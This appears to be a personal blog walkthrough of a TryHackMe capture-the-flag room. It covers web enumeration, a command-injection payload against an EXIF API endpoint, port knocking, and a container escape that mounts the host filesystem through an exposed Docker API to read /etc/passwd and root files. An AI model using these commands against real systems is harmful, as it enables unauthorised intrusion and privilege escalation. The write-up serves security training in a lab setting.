---
title: "THM: The Great Escape"
date: 2025-03-03
categories: [CTF, Red Team]
tags: [CTF, Red Team]
permalink: /posts/ctf-the-great-escape
image:
  path: /assets/img/thumbnails/ctf-the-great-escape.png
---



### **Walkthrough**

#### **CTF Platform**: TryHackMe  
#### **Level**: Medium  

#### **Tools Used**:

  - Nmap  
  - Gobuster  
  - Curl  
  - Docker  
  - Git  

#### **Resources Used:**:

  - [Tryhackme](https://tryhackme.com/room/thegreatescape)
  - Wordlists (e.g., `/usr/share/wordlists/dirb/big.txt`)  
  - GitHub Repository for Knock Tool  


## **Steps for the CTF**

---

### Task 2: A Simple Webapp  
**Objective**: Start off with a simple web application. Can you find the hidden flag?

#### Enumeration
1. Perform a full port scan using `nmap` to identify open ports and services running on the target machine.
   ```bash
   nmap -sSCV -p- <IP>
   ```
   - Use this command to gather information about the services running on the target.

2. Use `gobuster` to discover hidden directories or files on the web server.
   ```bash
   gobuster dir -f -u http://<IP> -w /usr/share/wordlists/dirb/big.txt
   ```
   - This will help you identify important endpoints that may contain useful information.

3. Check for security-related files such as `security.txt`.
   ```bash
   curl http://<IP>/.well-known/security.txt
   ```
   - Look for any hints or clues in the response.

4. Inspect HTTP headers for additional information.
   ```bash
   curl -I http://<IP>//api/fl46
   ```
   - Analyze the headers to uncover potential vulnerabilities or hidden paths.

#### Finding the Flag
- After enumerating the web application, locate the hidden flag.  
- **Hint**: The flag is stored in a specific endpoint. Use your enumeration results to identify it.

---

### Task 3: Root! Root?  
**Objective**: Gain access to the system and retrieve the second flag.

#### Enumeration
1. Check for common files like `robots.txt` to discover restricted or hidden paths.
   ```bash
   curl http://<IP>/robots.txt
   ```

2. Explore the discovered paths, such as `/exif-util`, to understand their functionality.

3. Investigate the `/api/exif` endpoint for potential vulnerabilities.
   - Example:
     ```bash
     curl http://<IP>/api/exif?url=http://api-dev-backup:8080
     ```

#### Exploitation
- The `/api/exif` endpoint appears to be vulnerable to command injection.  
- Experiment with payloads to execute commands on the server.  
  - Example:
    ```bash
    curl http://<IP>/api/exif?url=http://api-dev-backup:8080/exif?url=;ls ~
    ```
  - Use this technique to enumerate files and directories on the server.

#### Retrieving the Flag
- Once you gain command execution, explore sensitive files such as `/etc/passwd`, user home directories, and other critical locations.  
- **Hint**: Look for files like `dev-note.txt` or version control logs (e.g., `.git`) to uncover the flag.

---

### Task 4: The Great Escape  
**Objective**: Escalate privileges from the Docker container to the host system and retrieve the final flag.

#### Enumeration
1. Identify open ports on the target machine that may be related to Docker.
   ```bash
   nmap <IP> -p 2375
   ```
   - Port `2375` is commonly used for Docker API communication.

2. Clone the `knock` tool from GitHub to interact with the Docker API.
   ```bash
   git clone https://github.com/grongor/knock.git
   cd knock
   ./knock <IP> 42 1337 10420 6969 63000
   ```

#### Exploitation
1. Configure Docker to allow remote connections by modifying its configuration file.
   ```bash
   sudo nano /etc/docker/daemon.json
   ```
   - Restart Docker to apply the changes:
     ```bash
     sudo systemctl stop docker
     sudo systemctl start docker
     ```

2. Use the Docker API to interact with the container and escalate privileges.
   ```bash
   docker -H <IP>:2375 images
   docker -H <IP>:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh
   ```

#### Retrieving the Flag
- Once inside the container, navigate to the host's root directory and explore critical files.
  - Example:
    ```bash
    cat /etc/passwd
    cd /root
    ls
    cat flag.txt
    ```
- **Hint**: The final flag is located in the `/root` directory of the host system.
